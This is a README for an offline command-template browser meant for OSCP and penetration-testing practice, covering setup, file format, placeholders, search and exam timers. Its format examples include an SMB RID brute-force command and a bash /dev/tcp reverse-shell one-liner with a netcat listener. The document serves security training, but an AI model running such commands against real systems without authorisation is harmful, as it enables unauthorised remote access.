
# OSCP Command Generator

A lightweight, offline-friendly command template browser + generator for
OSCP/pen-test workflows.

- Load commands from simple `.txt` files in `/data`
- Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the left sidebar
- Search instantly without re-render flicker (DOM hide/show filtering)
- Filter by **Credential**, **Non-credential**, **Priority**, and **Favorites**
- Copy full commands (or individual steps) with one click
- Highlight placeholders, flags, operators, and `#comments` (but not numbering like `#2`)
- NEW: **Exam timer helpers** (20 / 40 / 90 mins) with **visual-only** alerts (no sound, no popups)
- NEW: **Jump to category with hits** during global search

------------------------------------------------------------------------

## Project Structure

oscp-command-generator/
├─ index.html
├─ css/
│  └─ style.css
├─ js/
│  └─ (modular JS files)
├─ data/
│  ├─ 01_Network_Enumeration.txt
│  ├─ 02_Web_Enumeration_and_attacks.txt
│  ├─ ...
│  └─ manifest.json
└─ README.md

------------------------------------------------------------------------

## Getting Started

### Python

python -m http.server 8000

Open:

http://localhost:8000/

### Node

npx http-server -p 8000

------------------------------------------------------------------------

## Command File Format

Each non-empty line represents one command entry:

Header: command with <tags> # comment (what this does / what to look for); kali-machine|target-machine

Example:

RID Brute: nxc smb <target> -u '' -p '' --rid-brute # enumerate domain users/groups via RID brute-force; kali-machine

------------------------------------------------------------------------

## Priority Commands

Prefix a command with ^

^Nmap quick scan: nmap -sC -sV <target>

------------------------------------------------------------------------

## Multi-step Commands

Repeated headers are grouped automatically:

Reverse shell: nc -lvnp <kaliPort>
Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1

------------------------------------------------------------------------

## Placeholders

Supported placeholders:

<target>
<target6>
<port>
<kali>
<kali6>
<kaliPort>
<user>
<password>
<domain>
<dc-ip>
<ntlm>
<filename1>
<filename2>
<wordlist1>
<wordlist2>

------------------------------------------------------------------------

## Search

Local search filters commands inside the current category.

Global search lists matching categories under **Found in:**

Clicking a category jumps directly to that category while keeping the search term.

------------------------------------------------------------------------

## Favorites

Click ☆ / ★ to favorite commands.
Favorites are stored in localStorage.

------------------------------------------------------------------------

## Exam Timer Helpers

Toolbar timers:

20 / 40 / 90 minute timers

Stop button cancels the timer.

Alerts are visual only:

- flashing red timer
- flashing browser tab attention

Active timer button style:

- dark red tint
- bold red outline

Pressing Stop resets the button style.

------------------------------------------------------------------------

## Exam Controls

Block Copy:
Prevents copying commands if required tags are missing.

Remember Non-sensitive Inputs:
Stores IPs, ports, filenames and wordlists in localStorage.
Passwords are never stored.

------------------------------------------------------------------------

## Keyboard Shortcuts

/ → focus search
j / k → move selection
c → copy selected command
Ctrl + + / - / 0 → adjust font size
Esc → close help

------------------------------------------------------------------------

## Notes

- Must be served via HTTP
- Fully static project
- Works offline once loaded
